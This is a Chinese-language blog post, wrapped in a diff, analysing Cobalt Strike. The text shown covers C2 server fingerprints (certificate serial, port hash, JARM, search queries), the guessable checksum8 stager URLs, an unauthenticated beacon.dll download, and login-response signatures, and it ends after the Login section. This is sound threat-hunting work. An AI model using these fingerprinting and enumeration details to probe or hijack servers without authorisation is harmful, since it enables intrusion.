@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言记录一下CobaltStrike的分析过程。 Infrastructure ConstructionCert1ssl.cert.serial:146473198     Port1hash:-2007783223 port:50050   Protocol1ssl.jarm:07d14d16d21d21d00042d41d00041de5fb3038104f457d92ba02e9311512">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对CobaltStrike的简单分析">
+<meta property="og:url" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/index.html">
+<meta property="og:site_name" content="Rj45mp&#39;s blog">
+<meta property="og:description" content="前言记录一下CobaltStrike的分析过程。 Infrastructure ConstructionCert1ssl.cert.serial:146473198     Port1hash:-2007783223 port:50050   Protocol1ssl.jarm:07d14d16d21d21d00042d41d00041de5fb3038104f457d92ba02e9311512">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307185125061.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307190300442.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307191709668.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307195128474.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307195107226.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307195346614.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307195645582.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307195721592.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307193625388.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313230531290.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310151128989.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310151140894.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310151151526.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220308122148082.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220308122209403.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307193839711.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307193950245.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307194038054.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220308175327111.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220308183330964.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220308183940229.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220308205237810.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220308214810395.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220308215035375.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220308215225184.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220308221642127.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220308221738608.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220308222141599.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220309001442190.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220309123619020.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220309123810761.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310135033306.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310135046352.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310135104129.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310135123756.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220309134539601.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220309134909937.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220309134629729.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220309134711587.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220309123409939.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313035526989.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313035538634.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313035552899.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311004617110.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311004919918.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311005204978.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311005506294.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311005748691.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311010426316.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311010502443.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311010851399.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311013403021.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311013504183.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311013552881.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311013615066.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311022921448.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311015109813.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311015609366.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311005748691.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311162955621.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311170012775.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311163601596.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311163624061.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311132501147.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311132532094.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311132155375.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311132108224.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311134725377.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220311134806998.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310003547887.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310023310614.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310023715150.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310024125073.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310003927713.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310012837716.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310020124671.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220309210813243.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220309210948612.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310125721481.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310125740318.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310130019683.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220309210429562.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310025907279.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310025843401.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220309205556009.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310030656658.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310120347884.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310124448239.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310130845426.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310133027507.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310133239056.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310133539372.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310133746033.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310132217596.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310132241082.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310132304499.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310131047863.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310131100707.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310130823919.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310130845426.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310131020298.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310144644305.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310144555219.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310145628231.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310145225994.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310153227516.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310154440280.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310154545833.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310161433958.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310163554491.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310163743024.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310164115060.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310165247197.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310162026284.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310162049163.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310162129217.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310162153437.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310162212253.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310162306252.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310164115060.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220310165219757.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220312214202785.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220312214539542.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313034733158.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313034746367.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313034757316.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220312214744822.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220312214804636.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220312214957532.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220312215009279.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313032021427.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220312215750582.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220312215818134.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220312215836771.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220312215928379.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220312215950878.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220312220007574.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313212047756.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313212205965.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313212229657.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313212334741.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313212345875.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313235609209.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313235633187.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313235810994.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313235844333.png">
+<meta property="og:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220313235939201.png">
+<meta property="article:published_time" content="2022-03-07T09:54:47.000Z">
+<meta property="article:modified_time" content="2022-12-31T14:21:04.935Z">
+<meta property="article:author" content="Rj45mp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rj45mp.github.io/Analysis-On-CobaltStrike/image-20220307185125061.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/Rj45mp.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/Rj45mp.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/Rj45mp.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>对CobaltStrike的简单分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/Analysis-On-CobaltStrike/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&text=对CobaltStrike的简单分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&title=对CobaltStrike的简单分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&is_video=false&description=对CobaltStrike的简单分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=对CobaltStrike的简单分析&body=Check out this article: https://rj45mp.github.io/Analysis-On-CobaltStrike/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&title=对CobaltStrike的简单分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&title=对CobaltStrike的简单分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&title=对CobaltStrike的简单分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&title=对CobaltStrike的简单分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&name=对CobaltStrike的简单分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/Analysis-On-CobaltStrike/&t=对CobaltStrike的简单分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Infrastructure-Construction"><span class="toc-number">2.</span> <span class="toc-text">Infrastructure Construction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cert"><span class="toc-number">2.1.</span> <span class="toc-text">Cert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Port"><span class="toc-number">2.2.</span> <span class="toc-text">Port</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Protocol"><span class="toc-number">2.3.</span> <span class="toc-text">Protocol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stager"><span class="toc-number">2.4.</span> <span class="toc-text">Stager</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login"><span class="toc-number">2.5.</span> <span class="toc-text">Login</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access"><span class="toc-number">3.</span> <span class="toc-text">Initial Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Executable"><span class="toc-number">3.1.</span> <span class="toc-text">Windows Executable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Executable-S"><span class="toc-number">3.2.</span> <span class="toc-text">Windows Executable(S)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scripted-Web-Delivery-S"><span class="toc-number">3.3.</span> <span class="toc-text">Scripted Web Delivery (S)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML-Application"><span class="toc-number">3.4.</span> <span class="toc-text">HTML Application</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS-Office-Macro"><span class="toc-number">3.5.</span> <span class="toc-text">MS Office Macro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">4.</span> <span class="toc-text">Post Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Execution"><span class="toc-number">4.1.</span> <span class="toc-text">Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Process-Inject"><span class="toc-number">4.2.</span> <span class="toc-text">Process Inject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Access"><span class="toc-number">4.3.</span> <span class="toc-text">Credential Access</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        对CobaltStrike的简单分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45mp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-07T09:54:47.000Z" itemprop="datePublished">2022-03-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下CobaltStrike的分析过程。</p>
+<h2 id="Infrastructure-Construction"><a href="#Infrastructure-Construction" class="headerlink" title="Infrastructure Construction"></a>Infrastructure Construction</h2><h3 id="Cert"><a href="#Cert" class="headerlink" title="Cert"></a>Cert</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssl.cert.serial:146473198</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/Analysis-On-CobaltStrike/image-20220307185125061.png" alt="image-20220307185125061"></p>
+<h3 id="Port"><a href="#Port" class="headerlink" title="Port"></a>Port</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash:-2007783223 port:50050</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Analysis-On-CobaltStrike/image-20220307190300442.png" alt="image-20220307190300442"></p>
+<h3 id="Protocol"><a href="#Protocol" class="headerlink" title="Protocol"></a>Protocol</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssl.jarm:07d14d16d21d21d00042d41d00041de5fb3038104f457d92ba02e9311512c2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Analysis-On-CobaltStrike/image-20220307191709668.png" alt="image-20220307191709668"></p>
+<h3 id="Stager"><a href="#Stager" class="headerlink" title="Stager"></a>Stager</h3><p>CobaltStrike 的 Beacon 生成分为两种，Stager Beacon 和 Stage&#x2F;Stageless Beacon。<br>其中，Stager Beacon 是分阶段的，其先是一段很简单的加载器，作用是向C2 Server 请求payload。</p>
+<p>C2 Server 在生成payload的url的过程存在可猜解性，可以被穷举，从而被暴露。</p>
+<p>生成url的过程：</p>
+<p>1、从大小写字母+数字的字符数组中随机指定长度的字符序列。</p>
+<p>2、调用checksum8函数计算字符序列的ASCII和与256的模是否等于固定值92L或93L。</p>
+<p>3、如果符合条件则生成stager的url。</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220307195128474.png" alt="image-20220307195128474"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220307195107226.png" alt="image-20220307195107226"></p>
+<p>C2 Server 对请求url的验证过程：</p>
+<p>1、当控制端生成stager时，调用MSFURI()生成请求URI，再把生成的URI写入stager。</p>
+<p>2、WebServer中的serve函数收到Stager的请求报文时，调用isStager&#x2F;isStager64函数验证传入的URI。</p>
+<p>3、isStager&#x2F;isStager64函数经过checksum8函数的计算后，结果等于92或者93就会返回payload文件信息。</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220307195346614.png" alt="image-20220307195346614"></p>
+<p>穷举检测的过程：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220307195645582.png" alt="image-20220307195645582"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220307195721592.png" alt="image-20220307195721592"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Sentinel-One/CobaltStrikeParser">工具1</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/whickey-r7/grab_beacon_config">工具2</a></p>
+<p>Beacon</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cobalt Strike Beacon</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/Analysis-On-CobaltStrike/image-20220307193625388.png" alt="image-20220307193625388"></p>
+<p>未授权访问：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313230531290.png" alt="image-20220313230531290"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310151128989.png" alt="image-20220310151128989"></p>
+<p>未对反斜杠做校验，导致通过构造请求即可获取到beacon.dll</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310151140894.png" alt="image-20220310151140894"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310151151526.png" alt="image-20220310151151526"></p>
+<h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>客户端和服务端在进行密码校验的时候，当密码正确会出现51966，错误则为00000</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220308122148082.png" alt="image-20220308122148082"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220308122209403.png" alt="image-20220308122209403"></p>
+<p>将51966转换一下作为搜索语法</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220307193839711.png" alt="image-20220307193839711"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response:&quot;\\x00\\x00\\xca\\xfe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Analysis-On-CobaltStrike/image-20220307193950245.png" alt="image-20220307193950245"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response:&quot;\\x00\\x00\\x00\\x00&quot; +port:&quot;50050&quot; +service:&quot;ssl&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/Analysis-On-CobaltStrike/image-20220307194038054.png" alt="image-20220307194038054"></p>
